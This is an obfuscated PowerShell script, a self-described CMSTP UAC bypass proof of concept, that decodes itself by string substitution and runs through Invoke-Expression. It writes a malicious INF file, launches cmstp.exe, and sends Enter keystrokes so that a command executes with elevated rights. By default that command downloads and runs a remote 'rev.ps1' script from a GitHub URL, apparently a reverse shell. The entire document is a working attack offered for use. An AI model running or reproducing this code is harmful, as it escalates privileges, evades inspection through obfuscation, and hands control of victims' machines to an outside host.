(('# UAC Bypass PoC using CMSTP and SendKeys
# Updated Version
# Author: Odd'+'var Moe (updated for execution fixes)

F'+'unction Set-INFFile {
    [CmdletBinding()]
    Param (
        [Parameter(HelpMessage=NzdSpecify the IN'+'F file locationNzd)]
     '+'   2m9ZInfFileLo'+'cation '+'= Nzd2m9Zenv:tempTdsC'+'MSTP.infNzd,

        [P'+'arameter('+'HelpMessage=NzdSpecify the command to launch in a UAC-privileged windowNzd)]
        [String]2m9ZCommandToExec'+'ute = NzdC:TdsWin'+'dowsT'+'dsSystem32TdsWindowsPowerShellTds'+'v1.0Tdspowershell.exe -Execution'+'Policy Bypass -'+'Command 9JxBINzdInvoke-Command -ScriptBlock ([ScriptBl'+'ock]::Create((New-Object Net.WebClient).Dow'+'nloadString(VBnhttps://raw.githubuserco'+'ntent.com/al1z4deh/OSEP/refs/h'+'eads/main/rev.ps'+'1VBn)))9JxBINzdNzd

 '+'   )

    2m9'+'ZInfContent = @Nzd
[version]
Signature=9JxBI2m9Zchicago9JxBI2m9Z
AdvancedINF=2.5

[DefaultInstall]
Cus'+'tomDestination=CustInstDe'+'stSectionAllUsers
RunPreSetupCommands=RunPreSetu'+'pCom'+'mands'+'Sec'+'tion

[Run'+'PreSetupCommandsSectio'+'n]
2m9ZCommandToExecute
taskkill /IM cmstp.e'+'xe'+' /F

['+'Cust'+'InstDestSectionAllUsers]
49000,49001'+'=AllUSer_LDI'+'DSe'+'ction, 7

[AllUSer_LDIDSection]
NzdHKLMNzd, NzdSOFTWARETdsMicrosof'+'tTdsWindowsTdsCurrentVersionTdsApp PathsT'+'dsCMMGR32.EXENzd, NzdProfileInstallPathNzd, Nzd%UnexpectedError%Nzd, NzdNzd

[Strings]
'+'ServiceName='+'NzdCorpVPNNzd
ShortSvcName=NzdCorpVPNNzd
Nzd@

    Try {
        W'+'rit'+'e-Output'+' NzdCreating INF file at 2m9ZInfFileLocationNzd
        2m9ZInfContent v6swT Out-File 2m9ZInfFileLocation -Encoding ASCII
    } Catch {
        Write-Error NzdFailed to create I'+'NF file: 2m9Z_Nzd
      '+'  Exit
    }
}

Function Get-Hwnd '+'{
    [CmdletBinding()]
    '+'Param (
        [Parameter(Mandatory=2m'+'9Z'+'True)] [string]2m'+'9ZProcessName
 '+'   )

    Try {
        2m9Zhwnd = Get-'+'Process -Name 2m9ZPr'+'ocessName -ErrorAction Stop v6swT Sele'+'ct-Object'+' -ExpandProperty MainWindowHandle
        2m9Zhwnd
    } Catch {
    '+'    Write-Output NzdFai'+'led to get window handle for 2m9ZProcessNameNzd
        2m9Znull
    }
}

Fun'+'ction'+' Set-WindowActive {
    Param (
 '+'       [Parameter(Mandatory=2m9ZTrue)] [string]2m9ZName
    )

    Add-Type -MemberDefinition @VBn
    [Dl'+'lImport(Nzduser32.dllNzd)] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport(Nzduser32.dllNzd, SetLas'+'tErr'+'or = true)] public static extern bool SetFo'+'regro'+'undWindow(IntPtr h'+'Wnd);
VBn@ -Name Api -Name'+'space User32

    2m9Zhwnd '+'= Get-Hwnd -P'+'rocessName 2m9ZNa'+'me
    If (2m9Zhwnd) {
        [User32.Api]::SetForegroundWindow'+'(2m9Zhwnd)
  '+' '+'     [User3'+'2.Api]::ShowWindow(2m9Zhwnd, 5)
    } Else '+'{
    '+'    Write-Output NzdFailed to activate window: 2m9ZNameNzd
    }
}

'+'ain Execution
S'+'et-INFFile
Add-Type -AssemblyN'+'ame System.Windows.Forms

If (Test-Path Nzd2m9Zenv:tempTdsCMSTP.infNzd) {
    Write-Output NzdLaunching CMS'+'TP'+' for UAC by'+'pass...Nzd
    2m9Zps'+' = New-O'+'bject System.Diagnostics.ProcessStartInfo
    2m9Zps.'+'FileName = Nzdc:TdswindowsTdssystem32T'+'dscmstp.exeNzd
'+' 2m'+'9Zps.Arguments = Nzd'+'/au 2m9Zen'+'v'+':tempTdsCMSTP.infNzd
    2m9Zps.UseS'+'hellExecute = 2m9Zfa'+'lse

    Try {
'+'        [System.D'+'iagno'+'stics.Proces'+'s]::Start(2m9Zps) v6swT Out-Null
        Start-'+'Sleep -Seconds 2

        # Wait until the CMSTP window becomes active
    '+'    Do {
'+'            Start-Slee'+'p -Milliseconds 500
         '+'   2m9Zac'+'tive = (Get-Hwnd -Proce'+'ssName NzdcmstpNzd)
        } Until ('+'2m9Zactive -ne 2m9Zn'+'ull)

     '+'   Write-Out'+'put NzdActivating CMSTP window...Nzd
        Set-WindowActive -Name NzdcmstpNzd
        Start-Sle'+'ep -Seconds 1

'+'        # Send the Enter key
        [System.Windows.Forms.SendKeys]::SendWait(Nzd{ENTER}Nzd)
        Write-Output '+'NzdEnter key sent. UAC bypass should b'+'e triggered.Nzd
'+'
    } Catch {
        Write-Error N'+'zdFailed to start CMSTP: 2m9Z'+'_Nzd
    }
} Else {
  '+'  Write-Error NzdINF file not found. Exiting...Nzd
}
')-CRePlacE ([CHaR]57+[CHaR]74+[CHaR]120+[CHaR]66+[CHaR]73),[CHaR]96  -RePLAce 'v6swT',[CHaR]124 -CRePlacE '2m9Z',[CHaR]36-RePLAce ([CHaR]84+[CHaR]100+[CHaR]115),[CHaR]92 -CRePlacE'Nzd',[CHaR]34  -RePLAce  'VBn',[CHaR]39) |iNvOKE-exPreSSIoN
